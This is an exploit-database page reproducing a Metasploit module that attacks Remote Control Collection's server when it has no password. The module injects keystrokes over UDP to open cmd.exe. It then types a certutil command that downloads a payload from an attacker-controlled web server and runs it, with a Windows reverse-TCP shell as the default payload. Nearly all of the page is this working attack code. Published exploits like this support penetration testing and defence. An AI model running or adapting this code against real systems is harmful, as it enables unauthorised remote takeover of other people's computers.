---
title: Remote Control Collection Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2022110050
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-11-30
fetch_date: 2025-10-04T00:03:36.228552
---

# Remote Control Collection Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Remote Control Collection Remote Code Execution** **2022.11.29**  Credit:  **[h00die](https://cxsecurity.com/author/h00die/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
Rank = NormalRanking
prepend Msf::Exploit::Remote::AutoCheck
include Exploit::Remote::Udp
include Exploit::EXE # generate\_payload\_exe
include Msf::Exploit::Remote::HttpServer::HTML
include Msf::Exploit::FileDropper
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'Remote Control Collection RCE',
'Description' => %q{
This module utilizes the Remote Control Server's, part
of the Remote Control Collection by Steppschuh, protocol
to deploy a payload and run it from the server. This module will only deploy
a payload if the server is set without a password (default).
Tested against 3.1.1.12, current at the time of module writing
},
'License' => MSF\_LICENSE,
'Author' => [
'h00die', # msf module
'H4rk3nz0' # edb, discovery
],
'References' => [
[ 'URL', 'http://remote-control-collection.com' ],
[ 'URL', 'https://github.com/H4rk3nz0/PenTesting/blob/main/Exploits/remote%20control%20collection/remote-control-collection-rce.py' ]
],
'Arch' => [ ARCH\_X64, ARCH\_X86 ],
'Platform' => 'win',
'Stance' => Msf::Exploit::Stance::Aggressive,
'Targets' => [
['default', {}],
],
'DefaultOptions' => {
'PAYLOAD' => 'windows/shell/reverse\_tcp',
'WfsDelay' => 5,
'Autocheck' => false
},
'DisclosureDate' => '2022-09-20',
'DefaultTarget' => 0,
'Notes' => {
'Stability' => [CRASH\_SAFE],
'Reliability' => [REPEATABLE\_SESSION],
'SideEffects' => [ARTIFACTS\_ON\_DISK, SCREEN\_EFFECTS]
}
)
)
register\_options(
[
OptPort.new('RPORT', [true, 'Port Remote Mouse runs on', 1926]),
OptInt.new('SLEEP', [true, 'How long to sleep between commands', 1]),
OptString.new('PATH', [true, 'Where to stage payload for pull method', '%temp%\\']),
OptString.new('CLIENTNAME', [false, 'Name of client, this shows up in the logs', '']),
]
)
end
def path
return datastore['PATH'] if datastore['PATH'].end\_with? '\\'
"#{datastore['PATH']}\\"
end
def special\_key\_header
"\x7f\x15\x02"
end
def key\_header
"\x7f\x15\x01"
end
def windows\_key
udp\_sock.put("#{special\_key\_header}\x01\x00\x00\x00\xab") # key up
udp\_sock.put("#{special\_key\_header}\x00\x00\x00\x00\xab") # key down
sleep(datastore['SLEEP'])
end
def enter\_key
udp\_sock.put("#{special\_key\_header}\x01\x00\x00\x00\x42")
sleep(datastore['SLEEP'])
end
def send\_command(command)
command.each\_char do |c|
udp\_sock.put("#{key\_header}#{c}")
sleep(datastore['SLEEP'] / 10)
end
enter\_key
sleep(datastore['SLEEP'])
end
def check
@check\_run = true
@check\_success = false
upload\_file
return Exploit::CheckCode::Vulnerable if @check\_success
return Exploit::CheckCode::Safe
end
def on\_request\_uri(cli, \_req)
@check\_success = true
if @check\_run # send a random file
p = Rex::Text.rand\_text\_alphanumeric(rand(8..17))
else
p = generate\_payload\_exe
end
send\_response(cli, p)
print\_good("Request received, sending #{p.length} bytes")
end
def upload\_file
connect\_udp
# send a space character to skip any screensaver
udp\_sock.put("#{key\_header} ")
print\_status('Connecting and Sending Windows key')
windows\_key
print\_status('Opening command prompt')
send\_command('cmd.exe')
filename = Rex::Text.rand\_text\_alphanumeric(rand(8..17))
filename << '.exe' unless @check\_run
if @service\_started.nil?
print\_status('Starting up our web service...')
start\_service('Path' => '/')
@service\_started = true
end
get\_file = "certutil.exe -urlcache -f http://#{srvhost\_addr}:#{srvport}/ #{path}#{filename}"
send\_command(get\_file)
if @check\_run.nil? || @check\_run == true
send\_command("del #{path}#{filename} && exit")
else
register\_file\_for\_cleanup("#{path}#{filename}")
print\_status('Executing payload')
send\_command("#{path}#{filename} && exit")
end
disconnect\_udp
end
def exploit
@check\_run = false
upload\_file
end
end

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022110050)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top